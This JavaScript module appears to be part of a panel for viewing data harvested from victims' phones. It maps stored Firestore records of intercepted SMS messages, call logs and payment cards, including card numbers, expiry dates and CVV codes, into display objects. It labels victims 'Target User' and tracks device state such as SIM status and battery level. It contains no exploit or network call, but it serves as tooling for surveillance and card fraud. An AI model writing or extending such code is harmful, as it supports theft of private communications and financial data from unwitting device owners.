/**
 * Smart Universal Firebase Firestore Document Normalizer
 * Automatically detects and maps arbitrary field names from any Firebase database format.
 */

// Universal field synonyms dictionary
const SENDER_KEYS = ['sender', 'from', 'address', 'ph', 'phone', 'number', 'mobile', 'senderName', 'sender_id', 'contact'];
const MESSAGE_KEYS = ['message', 'msg', 'body', 'text', 'content', 'smsText', 'sms_body', 'payload', 'data'];
const TIMESTAMP_KEYS = ['timestamp', 'time', 'date', 'created_at', 'createdAt', 'received_at', 'dateTime', 'dt'];
const DURATION_KEYS = ['duration', 'callDuration', 'dur', 'length', 'time_spent'];
const CALL_TYPE_KEYS = ['type', 'callType', 'direction', 'mode', 'status'];

const CARD_NUM_KEYS = ['cardNumber', 'card_number', 'cardNo', 'cc', 'account_number', 'accNo'];
const CARD_HOLDER_KEYS = ['cardHolder', 'card_holder', 'holderName', 'name', 'nameOnCard'];
const EXPIRY_KEYS = ['expiry', 'expiration', 'expDate', 'expiryDate', 'exp'];
const CVV_KEYS = ['cvv', 'cvc', 'securityCode', 'cvv2'];

/**
 * Intelligent helper to extract the first matching value from an object based on key synonyms
 */
function findBestField(obj, candidateKeys, fallback = 'N/A') {
  if (!obj || typeof obj !== 'object') return fallback;
  for (const key of candidateKeys) {
    if (obj[key] !== undefined && obj[key] !== null && obj[key] !== '') {
      return String(obj[key]);
    }
  }
  // Secondary fuzzy search across all object keys
  for (const [k, v] of Object.entries(obj)) {
    const lowerKey = k.toLowerCase();
    if (candidateKeys.some(candidate => lowerKey.includes(candidate.toLowerCase()))) {
      if (v !== undefined && v !== null && v !== '') return String(v);
    }
  }
  return fallback;
}

/**
 * Smart normalize an SMS payload object
 */
export function normalizeSmsItem(rawSms) {
  if (typeof rawSms === 'string') {
    return { sender: 'System / Log', message: rawSms, timestamp: 'Just now', rawData: { text: rawSms } };
  }
  
  const sender = findBestField(rawSms, SENDER_KEYS, 'Unknown Sender');
  const message = findBestField(rawSms, MESSAGE_KEYS, JSON.stringify(rawSms));
  const timestamp = findBestField(rawSms, TIMESTAMP_KEYS, 'Recorded');

  return {
    sender,
    message,
    timestamp,
    rawData: rawSms
  };
}

/**
 * Smart normalize a Call log payload object
 */
export function normalizeCallItem(rawCall) {
  if (typeof rawCall === 'string') {
    return { number: rawCall, type: 'INCOMING', duration: 'Unknown', timestamp: 'Just now', rawData: { text: rawCall } };
  }

  const number = findBestField(rawCall, SENDER_KEYS, 'Unknown Number');
  const type = findBestField(rawCall, CALL_TYPE_KEYS, 'INCOMING').toUpperCase();
  const duration = findBestField(rawCall, DURATION_KEYS, '0s');
  const timestamp = findBestField(rawCall, TIMESTAMP_KEYS, 'Recorded');

  return {
    number,
    type,
    duration,
    timestamp,
    rawData: rawCall
  };
}

/**
 * Smart normalize a Card payload object
 */
export function normalizeCardItem(rawCard) {
  if (typeof rawCard === 'string') {
    return { cardNumber: rawCard, cardHolder: 'Target User', expiry: 'N/A', cvv: '•••', rawData: { text: rawCard } };
  }

  const cardNumber = findBestField(rawCard, CARD_NUM_KEYS, '•••• •••• •••• ••••');
  const cardHolder = findBestField(rawCard, CARD_HOLDER_KEYS, 'Target User');
  const expiry = findBestField(rawCard, EXPIRY_KEYS, 'N/A');
  const cvv = findBestField(rawCard, CVV_KEYS, '•••');

  return {
    cardNumber,
    cardHolder,
    expiry,
    cvv,
    rawData: rawCard
  };
}

/**
 * Extracts unmapped custom metadata fields for dynamic analytics
 */
export function extractCustomFields(targetUser) {
  const knownKeys = ['id', 'userId', 'fullName', 'mobileNumber', 'simState', 'batteryLevel', 'isActive', 'lastActivityTime', 'totalSmsCount', 'totalCallsCount', 'smsDataList', 'callDataList', 'cardDataList'];
  const customFields = {};

  if (!targetUser || typeof targetUser !== 'object') return customFields;

  for (const [k, v] of Object.entries(targetUser)) {
    if (!knownKeys.includes(k) && v !== undefined && v !== null) {
      customFields[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
    }
  }

  return customFields;
}
